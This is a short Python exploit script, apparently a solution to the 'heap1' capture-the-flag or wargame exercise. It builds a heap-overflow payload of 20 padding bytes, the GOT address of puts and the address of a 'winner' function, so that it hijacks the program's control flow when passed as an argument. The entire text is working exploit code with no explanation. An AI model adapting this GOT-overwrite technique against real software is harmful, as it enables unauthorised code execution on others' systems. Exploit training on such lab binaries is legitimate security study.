#!/usr/bin/python
from struct import pack as p
#./heap1 `/tmp/x.py`

putsgot = p("I", 0x08049774)
winnerpointer = p("I", 0x08048494)

s = ''
s += 'A' * 20
s += putsgot
s += ' ' 
s += winnerpointer 

print s
